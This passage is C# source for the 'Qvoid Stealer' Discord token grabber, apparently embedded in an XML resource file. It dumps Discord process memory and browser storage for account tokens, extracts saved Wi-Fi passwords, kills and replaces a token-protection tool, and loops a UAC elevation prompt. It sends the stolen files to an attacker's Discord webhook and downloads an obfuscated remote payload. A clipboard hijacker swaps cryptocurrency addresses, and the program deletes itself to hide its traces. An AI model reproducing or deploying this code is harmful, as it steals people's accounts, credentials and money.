
                if (!Settings.Silent &amp;&amp; String.IsNullOrEmpty(_Token))
                {
                    //Closing Discord
                    var DiscordProcs = Process.GetProcessesByName("Discord");
                    foreach (var proc in DiscordProcs)
                        try { proc.Kill(); } catch { }

                    //Starting Discord
                    if (!String.IsNullOrEmpty(discord.Name))
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");
                }

                return 0;
            }

            //If there is no user logged in
            if (!(!File.Exists(usersPath) || (Encryption.ComputeSha256Hash(Other.Sort(HeadMessage).Replace(Environment.NewLine, "")) != File.ReadAllText(usersPath))))
                return 0;

            File.WriteAllText(usersPath, Encryption.ComputeSha256Hash(Other.Sort(HeadMessage).Replace(Environment.NewLine, "")));

            if (File.Exists(finalZip))
                File.Delete(finalZip);

            ZipFile.CreateFromDirectory(filesDir, finalZip);

            Settings.Webhook.Send(new DiscordMessage()
            {
                Embeds = new List&lt;DiscordEmbed&gt;()
                {
                    new DiscordEmbed()
                    {
                        Footer = new EmbedFooter
                        {
                            Text = "Qvoid Stealer | Paid version",
                        },
                        Timestamp = DateTime.UtcNow,
                        Color = Other.Spectrum(0),
                        Fields = fields,
                        Title = "New victim entered the trap!",
                        Description = $"Injected successfully ... waiting for the victim to relogin."
                    }
                },
                Username = "Qvoid Stealer",
                AvatarUrl = "https://cdn.discordapp.com/attachments/827625760843235368/936248839956996116/unknown.png"
            }, new FileInfo[] { new FileInfo(finalZip) });

            if (!Settings.Silent)
            {
                //Closing Discord
                var DiscordProcs = Process.GetProcessesByName("Discord");
                foreach (var proc in DiscordProcs)
                    try { proc.Kill(); } catch { }

                //Starting Discord
                if (!String.IsNullOrEmpty(discord.Name))
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");
            }

            return 1;
        }

        static public void Initialize(string[] args)
        {
            var code = Grab(args);
            if (code == 0)
                return;

            if (code == 1)
            {
                //First time
            }
            else if (code == 2)
            {
                //Discord not found
            }
        }

        /// &lt;summary&gt;
        /// Extracts the grabber dependencies to the destination directory.
        /// &lt;/summary&gt;
        /// &lt;param name="Path"&gt;&lt;/param&gt;
        /// &lt;param name="Destination"&gt;&lt;/param&gt;
        static public void Extract(string Path, string Destination)
        {
            Directory.CreateDirectory(Path);

            FileInfo info = new FileInfo(Path + "Release.zip");
            string _link = Encryption.ROT13("uggcf://pqa.qvfpbeqncc.pbz/nggnpuzragf/827625760843235368/942786364246736907/Eryrnfr.mvc");

            if (!info.Exists)
            {
                //Downloads the dependencies if they don't exists.
                using (WebClient wc = new WebClient())
                    wc.DownloadFile(_link, Path + "Release.zip");
            }
            else
            {
                //Verifing the file (you can use SHA256CheckSum), if not valid we install the dependencies.
                if (info.Length &lt;= 5300)
                    using (WebClient wc = new WebClient())
                        wc.DownloadFile(_link, Path + "Release.zip");
            }

            try
            {
                //Extracts the ZIP content (dependencies) to the destination directory.
                ZipFile.ExtractToDirectory(Path + "Release.zip", Destination);
            }
            catch { }
        }

        /// &lt;summary&gt;
        /// Deletes all the files and traces created by the grabber.
        /// &lt;/summary&gt;
        static public void DeleteTraces(bool DeleteRecursive = false, bool Destruct = true)
        {
            try
            {
                string path = Path.GetTempPath() + $"\\{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 10)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 11)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 12)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 13)}-{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 14)}\\";
                if (Directory.Exists(path))
                    Directory.Delete(path, true);
            }
            catch (Exception ex) { Debug.WriteLine("Error occured while deleting the main Path;" + ex.Message); }

            if (DeleteRecursive)
            {
                string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + $"\\{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 20)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 21)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 22)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 23)}-{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 24)}.dat";
                if (File.Exists(usersPath))
                {
                    try { File.Delete(usersPath); }
                    catch (Exception ex) { Debug.WriteLine("Error occured while deleting the log file;" + ex.Message); }
                }
            }

            if (Destruct)
            {
                string app = AppDomain.CurrentDomain.FriendlyName;
                string AppPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location).ToString() + $@"\{app}";

                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.FileName = "cmd.exe";
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.Arguments = "/C ping 1.1.1.1 -n 1 -w 3000 &gt; Nul &amp; Del " + AppPath;
                Process.Start(startInfo);

                Process.GetCurrentProcess().Kill();
            }
        }
    }

    /// &lt;summary&gt;
    /// Contains everything releated to the Discord process. 
    /// &lt;/summary&gt;
    public class Discord
    {
        public List&lt;string&gt; TokensPaths { get; } = new List&lt;string&gt;();
        public List&lt;string&gt; Voices { get; } = new List&lt;string&gt;();
        public List&lt;string&gt; Cores { get; } = new List&lt;string&gt;();
        public List&lt;DiscordClient&gt; DumpedClients { get; private set; } = new List&lt;DiscordClient&gt;();
        public List&lt;string&gt; DumpedTokens { get; private set; } = new List&lt;string&gt;();

        public bool IsExists { get; private set; }
        public Version Version { get; }
        public string Name { get; }
        public FileInfo FileInfo { get; }
        public List&lt;Process&gt; Processes { get; }

        [DllImport("dbghelp.dll", SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, UInt32 ProcessId, SafeHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        /// &lt;summary&gt;
        /// The constructor will find us all the information we need about the client and possible tokens locations.
        /// &lt;/summary&gt;
        public Discord()
        {
            this.Processes = Process.GetProcessesByName("discord").ToList();
            Voices = new List&lt;string&gt;();
            Cores = new List&lt;string&gt;();
            TokensPaths = new List&lt;string&gt;();

            var directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            foreach (var directory in directories)
            {
                if (directory.ToLower().Contains("discord"))
                {
                    var core = Directory.GetFiles(directory, "core.asar", SearchOption.AllDirectories);
                    var index = Directory.GetFiles(directory, "index.js", SearchOption.AllDirectories);
                    var discord_exe = Directory.GetFiles(directory, "Discord.exe", SearchOption.AllDirectories);
                    var capture_exe = Directory.GetFiles(directory, "capture_helper.exe", SearchOption.AllDirectories);

                    foreach (var coreFile in core)
                        foreach (var indexFile in index)
                            if (coreFile.Replace("core.asar", "") == indexFile.Replace("index.js", ""))
                                Cores.Add(coreFile.Replace("core.asar", ""));

                    foreach (var capture in capture_exe)
                        foreach (var indexFile in index)
                            if (capture.Replace("capture_helper.exe", "") == indexFile.Replace("index.js", ""))
                                Voices.Add(capture.Replace("capture_helper.exe", ""));

                    foreach (var file in discord_exe)
                    {
                        FileInfo info = new FileInfo(file);
                        if (info.Length &gt; 60000)
                        {
                            var objInfo = FileVersionInfo.GetVersionInfo(file);
                            if (objInfo.LegalCopyright == "Copyright (c) 2022 Discord Inc. All rights reserved.")
                            {
                                if (objInfo.FileName.EndsWith("Discord.exe"))
                                {
                                    foreach (var proc in Processes.ToList())
                                    {
                                        if (proc.MainModule.FileName != objInfo.FileName)
                                            Processes.Remove(proc);
                                    }

                                    if (Processes != null &amp;&amp; Processes.Count &gt; 0)
                                    {
                                        if (Processes.ToList().First().MainModule.FileName == objInfo.FileName)
                                        {
                                            FileInfo = new FileInfo(Processes.First().MainModule.FileName);
                                            Name = Processes.First().MainModule.FileName;
                                            Version = new Version(objInfo.FileVersion);
                                        }
                                    }
                                    else
                                    {
                                        FileInfo = new FileInfo(file);
                                        Name = file;
                                        Version = new Version(objInfo.FileVersion);
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }
            }

            this.IsExists = FileInfo != null &amp;&amp; FileInfo.Exists;

            directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            foreach (var directory in directories)
            {
                if (directory.ToLower().Contains("discord"))
                {
                    var subDirectories = Directory.GetDirectories(directory);
                    foreach (var localDirectory in subDirectories)
                    {
                        if (localDirectory.Contains("Local Storage"))
                        {
                            var temp = Directory.GetDirectories(localDirectory);
                            foreach (var item in temp)
                                if (item.Contains("leveldb"))
                                    TokensPaths.Add($"{item}\\");
                        }
                    }
                }
            }

            if (TokensPaths.Count == 0)
            {
                if (File.Exists(Name.Replace("Discord.exe", "") + "resources\\tmp\\common\\paths.js"))
                {
                    var newLocation_tray = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "tray-connected.png", SearchOption.AllDirectories);
                    var newLocation_Transport = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "badge-11.ico", SearchOption.AllDirectories);
                    foreach (var _file in newLocation_tray)
                    {
                        foreach (var __file in newLocation_Transport)
                        {
                            if (_file.Replace("tray-connected.png", "") == __file.Replace("badge-11.ico", ""))
                            {
                                if (Directory.Exists(_file.Replace("tray-connected.png", "") + "\\Local Storage\\leveldb"))
                                    TokensPaths.Add(_file.Replace("tray-connected.png", "") + "\\Local Storage\\leveldb");
                            }
                        }
                    }
                }
            }
        }

        /// &lt;summary&gt;
        /// Dumping tokens from the process and check them.
        /// &lt;/summary&gt;
        public void Dump()
        {
            List&lt;DiscordClient&gt; clients = new List&lt;DiscordClient&gt;();
            List&lt;string&gt; tokens = new List&lt;string&gt;();

            foreach (Process proid in Process.GetProcessesByName("discord"))
            {
                uint ProcessId = (uint)proid.Id;
                IntPtr hProcess = proid.Handle;
                string dumpPath = Path.GetTempPath() + $"\\Report28251213-{DateTime.UtcNow.Ticks % 50000}.log";
                using (FileStream procdumpFileStream = File.Create(dumpPath))
                    MiniDumpWriteDump(hProcess, ProcessId, procdumpFileStream.SafeFileHandle, 0x2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                string fileContent = File.ReadAllText(dumpPath);

                MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
                MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}", RegexOptions.Compiled);
                MatchCollection encryptedMatches = Regex.Matches(fileContent, "(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

                foreach (Match match in matches)
                    if (!tokens.Contains(match.Value))
                        tokens.Add(match.Value);

                foreach (Match match in mfaMatches)
                    if (!tokens.Contains(match.Value))
                        tokens.Add(match.Value);

                foreach (Match match in encryptedMatches)
                    if (!tokens.Contains(match.Value))
                        tokens.Add(match.Value);

                foreach (var token in tokens)
                {
                    var client = new DiscordClient(token);
                    if (client.IsValidToken)
                        this.DumpedClients.Add(client);
                }

                File.Delete(dumpPath);
            }

            DumpedClients.AddRange(clients);
            DumpedTokens.AddRange(tokens);

            DumpedClients = DumpedClients.Distinct().ToList();
            DumpedTokens = DumpedTokens.Distinct().ToList();
        }

        /// &lt;summary&gt;
        /// Bypassing known token protectors and replacing the protectors with the grabber ^^.
        /// &lt;/summary&gt;
        public void BypassProtectors(string Path)
        {
            List&lt;Protector&gt; protectors = new List&lt;Protector&gt;()
            {
                new Protector()
                {
                    Directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector",
                    Name = "DiscordTokenProtector"
                },
                new Protector()
                {
                    Directory = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\DTP_WindowsInstaller",
                    Name = "DiscordTokenProtector"
                },
            };

            foreach (var protector in protectors)
            {
                var process = Process.GetProcessesByName(protector.Name);
                if (process.Length &gt; 0)
                {
                    foreach (var proc in process)
                    {
                        //Terminating the protector
                        try { proc.Kill(); }
                        catch (Exception ex)
                        {
                            if (ex.Message.Contains("Access"))
                            {
                                if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
                                {
                                    //Could not terminate the protector because it has higher privileges.
                                    using (Process newProc = new Process())
                                    {
                                        while (true)
                                        {
                                            try
                                            {
                                                newProc.StartInfo.FileName = Application.ExecutablePath;
                                                newProc.StartInfo.CreateNoWindow = true;
                                                newProc.StartInfo.UseShellExecute = true;
                                                newProc.StartInfo.Verb = "runas";
                                                newProc.Start();

                                                break;
                                            }
                                            catch (Exception)
                                            { continue; }
                                        }
                                    }
                                }
                            }
                        }

                        try
                        {
                            if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
                                Environment.Exit(0);

                            string MainModulePath = protector.Directory;
                            if (!Directory.Exists(MainModulePath))
                                continue;

                            Grabber.Extract(Path, protector.Directory);

                            Thread.Sleep(100);
                            if (File.Exists($"{protector.Directory}\\{protector.Name}.exe"))
                                File.Delete($"{protector.Directory}\\{protector.Name}.exe");

                            Thread.Sleep(1000);
                            File.Copy(Assembly.GetEntryAssembly().Location, $"{protector.Directory}\\{protector.Name}.exe");
                        }
                        catch (Exception ex)
                        {
                            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "Logs.txt", ex.Message);
                            continue;
                        }
                    }

                }
            }

            var DiscordProcs = Process.GetProcessesByName("Discord");
            foreach (var proc in DiscordProcs)
                try { proc.Kill(); } catch { }

            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");
        }

        /// &lt;summary&gt;
        /// 
        /// &lt;/summary&gt;
        /// &lt;returns&gt;&lt;/returns&gt;
        public List&lt;string&gt; GetTokens()
        {
            string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            var finalTokens = new List&lt;string&gt;();

            var possibleLocations = new List&lt;string&gt;()
            {
                localAppdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
                localAppdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
                localAppdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
                localAppdata + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb",
                roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
                roaming + "\\Lightcord\\Local Storage\\leveldb",
                roaming + "\\Amigo\\Local Storage\\leveldb",
                roaming + "\\Torch\\Local Storage\\leveldb",
                roaming + "\\Kometa\\Local Storage\\leveldb",
                roaming + "\\Orbitum\\Local Storage\\leveldb",
                roaming + "\\CentBrowser\\Local Storage\\leveldb",
                roaming + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb",
                roaming + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
                roaming + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
                roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
            };
            possibleLocations.AddRange(this.TokensPaths);

            finalTokens.AddRange(Other.FindTokens(possibleLocations, this.Name));

            finalTokens.AddRange(Other.FindTokensGecko(new List&lt;string&gt;()
            {
                roaming + "\\Mozilla\\Firefox\\Profiles",
                roaming + "\\Waterfox\\Profiles",
                roaming + "\\Moonchild Productions\\Pale Moon\\Profiles",
            }, this.Name));

            return finalTokens;
        }
    }

    /// &lt;summary&gt;
    /// Implementation for "netsh wlan show profile" command.
    /// &lt;/summary&gt;
    public class WirelessLan
    {
        public bool IsAvailable { get; private set; } = true;
        public List&lt;SSID&gt; SSIDs { get; private set; } = new List&lt;SSID&gt;();

        public class SSID
        {
            public Profile Profile { get; private set; }
            public Connectivity Connectivity { get; private set; }
            public Security Security { get; private set; }

            public SSID(Profile profile, Connectivity connectivity, Security security)
            {
                this.Profile = profile;
                this.Connectivity = connectivity;
                this.Security = security;
            }
        }

        public class Profile
        {
            public string Version { get; private set; }
            public string Type { get; } = "Wireless Lan";
            public string Name { get; private set; }
            public Controls _Controls { get; private set; } = new Controls();

            public Profile(string profileInformation)
            {
                string[] fields = profileInformation.Substring(profileInformation.IndexOf("Profile information \r\n------------------- \r\n    ") + "Profile information \r\n------------------- \r\n    ".Length).Split(new string[] { "\r\n        " }, StringSplitOptions.None);
                string[] queries = fields[0].Split(new string[] { "\r\n    " }, StringSplitOptions.None);

                Version = queries[0].Split(':')[1].Substring(1);
                Name = queries[2].Split(':')[1].Substring(1);

                _Controls.Connection = fields[1].Split(':')[1].Contains("auto") ? Controls.ConnectionMode.Auto : Controls.ConnectionMode.Manual;
                _Controls.MacRandomization = !fields[4].Split(':')[1].Contains("disab");
                _Controls.AutoSwitch = !fields[3].Split(':')[1].Contains("Do not switch");
                _Controls.Broadcast = fields[2].Split(':')[1].Substring(1);
            }

            public class Controls
            {
                public enum ConnectionMode
                {
                    Auto,
                    Manual
                }

                public ConnectionMode Connection;
                public string Broadcast { get; internal set; }
                public bool AutoSwitch { get; internal set; }
                public bool MacRandomization { get; internal set; }
            }
        }

        public class Connectivity
        {
            public int SSIDs { get; private set; }
            public string Name { get; private set; }
            public string Type { get; private set; }
            enum _Type
            {
                IBSS,
                ESS
            }

            public Connectivity(string connectivitySettings)
            {
                var fields = connectivitySettings.Split(new string[] { "\r\n    " }, StringSplitOptions.None);
                SSIDs = int.Parse(fields[1].Split(':')[1].Substring(1));
                Name = fields[2].Split(':')[1].Substring(1).Replace("\"", "");
                Type = fields[3].Split(':')[1].Substring(1);
            }
        }

        public class Security
        {
            public enum Authentication
            {
                Open,
                Shared,
                WPA,
                WPAPSK,
                WPA2,
                WPA2PSK
            }

            public enum Chiper
            {
                None = 0x00,
                WEP40 = 0x01,
                TKIP = 0x02,
                CCMP = 0x04,
                WEP104 = 0x05,
                WPA_USER_GROUP = 0x100,
                RSN_USE_GROUP = 0x100,
                WEP = 0x101,
            }

            public Authentication _Authentication { get; private set; }
            public Chiper _Chiper { get; private set; }
            public bool SecurityKeyPresent { get; private set; }
            public string Key { get; private set; }

            public Security(string securitySettings)
            {
                string[] fields = securitySettings.Split(new string[] { "\r\n    " }, StringSplitOptions.None);

                foreach (var field in fields)
                    if (field.Contains("Security key"))
                        SecurityKeyPresent = field.Split(':')[1].Substring(1).Contains("Present");

                if (SecurityKeyPresent &amp;&amp; fields.Length == 7)
                    Key = fields[6].Split(':')[1].Substring(1);
                _Chiper = (Chiper)Enum.Parse(typeof(Chiper), fields[2].Split(':')[1].Substring(1));
                _Authentication = (Authentication)Enum.Parse(typeof(Authentication), fields[1].Split(':')[1].Substring(1).Contains("-") ? fields[1].Split(':')[1].Substring(1).Split('-')[0] : fields[1].Split(':')[1].Substring(1));
            }
        }

        public WirelessLan()
        {
            Process proc = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "netsh.exe",
                    Arguments = "wlan show profile",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                },
            };
            proc.Start();

            string output = proc.StandardOutput.ReadToEnd();
            if (!output.Contains("\r\n\r\nUser profiles\r\n-------------\r\n"))
            {
                IsAvailable = false;
                return;
            }

            string[] content = output.Split(new string[] { "\r\n\r\nUser profiles\r\n-------------\r\n" }, StringSplitOptions.None)[1].Split(':');

            proc.Close();
            proc.Dispose();

            List&lt;string&gt; SSIDs = new List&lt;string&gt;();
            Dictionary&lt;string, string&gt; Modules = new Dictionary&lt;string, string&gt;();

            content.ToList().ForEach(i =&gt;
            {
                var ssid = i.Split(new string[] { "All User Profile" }, StringSplitOptions.None);
                if (ssid.Length &gt; 0 &amp;&amp; ssid[0].Contains("\r\n"))
                    SSIDs.Add(ssid[0].Split(new string[] { "\r\n" }, StringSplitOptions.None)[0].Substring(1));
            });

            foreach (var ssid in SSIDs)
            {
                proc = new Process()
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh.exe",
                        Arguments = $"wlan show profile {ssid} key=clear",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                    },
                };
                proc.Start();

                string result = proc.StandardOutput.ReadToEnd();
                var options = result.Split(new string[] { "\r\n\r\n" }, StringSplitOptions.None);
                if (options[0].Contains("There is no such wireless interface on the system"))
                    continue;

                this.SSIDs.Add(new SSID(new Profile(options[2]), new Connectivity(options[3]), new Security(options[4])));

                proc.Close();
                proc.Dispose();
            }
        }
    }

    /// &lt;summary&gt;
    /// Model class
    /// &lt;/summary&gt;
    sealed class Protector
    {
        public string Directory { get; set; }
        public string Name { get; set; }
    }

    /// &lt;summary&gt;
    /// Simple Crypto clipper.
    /// &lt;/summary&gt;
    public class CryptoClipper
    {
        public struct Patterns
        {
            public static Regex BTC = new Regex(@"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", RegexOptions.Compiled);
            public static Regex ETH = new Regex("/^0x[a-fA-F0-9]{40}$/", RegexOptions.Compiled);
            public static Regex DOGE = new Regex("D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}", RegexOptions.Compiled);
            public static Regex LTC = new Regex("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}", RegexOptions.Compiled);
            public static Regex XMR = new Regex("[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}", RegexOptions.Compiled);
            public static Regex DASH = new Regex("X[1-9A-HJ-NP-Za-km-z]{33}", RegexOptions.Compiled);
            public static Regex XRP = new Regex("r[0-9a-zA-Z]{24,34}", RegexOptions.Compiled);
            public static Regex NEO = new Regex("A[0-9a-zA-Z]{33}", RegexOptions.Compiled);
        }

        public bool Enabled;
        public string BTC_Address { get; internal set; }
        public string ETH_Address { get; private set; }
        public string DOGE_Address { get; private set; }
        public string LTC_Address { get; private set; }
        public string XMR_Address { get; private set; }
        public string DASH_Address { get; private set; }
        public string NEO_Address { get; private set; }
        public string XRP_Address { get; private set; }

        public CryptoClipper(string BTC, string ETH, string DOGE, string LTC, string XMR, string DASH, string NEO, string XRP)
        {
            if (IsValid(Patterns.BTC, BTC, ""))
                this.BTC_Address = BTC;
            else if (IsValid(Patterns.ETH, ETH, ""))
                this.ETH_Address = ETH;
            else if (IsValid(Patterns.LTC, LTC, ""))
                this.LTC_Address = LTC;
            else if (IsValid(Patterns.XMR, XMR, ""))
                this.XMR_Address = XMR;
            else if (IsValid(Patterns.DOGE, DOGE, ""))
                this.DOGE_Address = DOGE;
            else if (IsValid(Patterns.DASH, DASH, ""))
                this.DASH_Address = DASH;
            else if (IsValid(Patterns.XRP, XRP, ""))
                this.XRP_Address = XRP;
            else if (IsValid(Patterns.NEO, NEO, ""))
                this.NEO_Address = NEO;

            Enabled = !string.IsNullOrEmpty(this.NEO_Address)
                   || !string.IsNullOrEmpty(this.BTC_Address)
                   || !string.IsNullOrEmpty(this.ETH_Address)
                   || !string.IsNullOrEmpty(this.LTC_Address)
                   || !string.IsNullOrEmpty(this.XMR_Address)
                   || !string.IsNullOrEmpty(this.DOGE_Address)
                   || !string.IsNullOrEmpty(this.DASH_Address)
                   || !string.IsNullOrEmpty(this.XRP_Address);
        }

        public void Start()
        {
            Thread t = new Thread(() =&gt;
            {
                while (true)
                {
                    Thread.Sleep(100);

                    string text = string.Empty;
                    try { text = Clipboard.GetText(); }
                    catch { continue; }

#pragma warning disable CS0642
                    if (IsValid(Patterns.BTC, text, BTC_Address)) ;
                    else if (IsValid(Patterns.ETH, text, ETH_Address)) ;
                    else if (IsValid(Patterns.LTC, text, LTC_Address)) ;
                    else if (IsValid(Patterns.XMR, text, XMR_Address)) ;
                    else if (IsValid(Patterns.DOGE, text, DOGE_Address)) ;
                    else if (IsValid(Patterns.DASH, text, DASH_Address)) ;
                    else if (IsValid(Patterns.XRP, text, XRP_Address)) ;
                    else if (IsValid(Patterns.NEO, text, NEO_Address)) ;
                    //You can add here more wallets...
#pragma warning restore CS0642
                }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            t.Join();

            while (t.IsAlive)
                Thread.Sleep(1);
        }

        public bool IsValid(Regex regex, string input, string Address)
        {
            //Checking if the address that we will replace is not empty (because we don't want to replace his wallet with empty wallt) and if the given text matching the expression.
            if (!string.IsNullOrEmpty(Address) &amp;&amp; regex.Match(input).Success)
            {
                Clipboard.SetText(Address);
                return true;
            }

            return false;
        }
    }

    class Settings
    {
        public static DiscordWebhook Webhook = new DiscordWebhook("%WEBHOOK_HERE%");
        public static TelegramAPI Telegram = new TelegramAPI("%TELEGRAM_TOKEN_HERE%", 0/*%TELEGRAM_CHAT_ID_HERE%*/);
        public static CryptoClipper Clipper = new CryptoClipper("BTC_ADDRESS_HERE_", "ETH_ADDRESS_HERE_", "DODGE_ADDRESS_HERE_", "LTC_ADDRESS_HERE_", "XMR_ADDRESS_HERE_", "DASH_ADDRESS_HERE_", "NEO_ADDRESS_HERE_", "XRP_ADDRESS_HERE_");

        public static bool Silent = false;
        public static bool AntiWebSinffers = false;
        public static bool AntiDebug = false;
        public static bool AntiVM = false;
        public static bool AntiSandBoxie = false;
        public static bool AntiEmulation = false;
    }
}</value>
  </data>
</root>
